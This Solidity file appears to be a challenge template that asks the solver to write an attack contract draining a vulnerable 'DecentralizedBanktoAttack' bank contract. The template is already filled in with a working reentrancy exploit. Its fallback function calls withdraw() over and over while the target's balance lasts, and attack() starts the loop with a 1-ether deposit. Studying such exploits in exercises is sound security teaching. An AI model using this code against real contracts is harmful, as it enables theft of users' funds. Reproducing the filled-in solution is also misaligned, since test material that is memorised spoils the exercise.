// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./DecentralizedBanktoAttack.sol";

// DecentralizedBanktoAttack.sol is a vulnerable contract.
// Please complete the Attack contract that can steal all the balances from DecentralizedBanktoAttack.
// This contract shall include attack() method for the VM to call.

contract AttackChallenge {
    DecentralizedBanktoAttack public decentralizedBanktoAttack;

    constructor(address _decentralizedBanktoAttackAddress) {
        decentralizedBanktoAttack = DecentralizedBanktoAttack(
            _decentralizedBanktoAttackAddress
        );
    }

    // You can implement the attack() and related neccessary function here
    ////////////////////////////////////////////

    fallback() external payable {
        if (address(decentralizedBanktoAttack).balance >= 1 ether) {
            decentralizedBanktoAttack.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        decentralizedBanktoAttack.deposit{value: 1 ether}();
        decentralizedBanktoAttack.withdraw();
    }

    ////////////////////////////////////////////

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
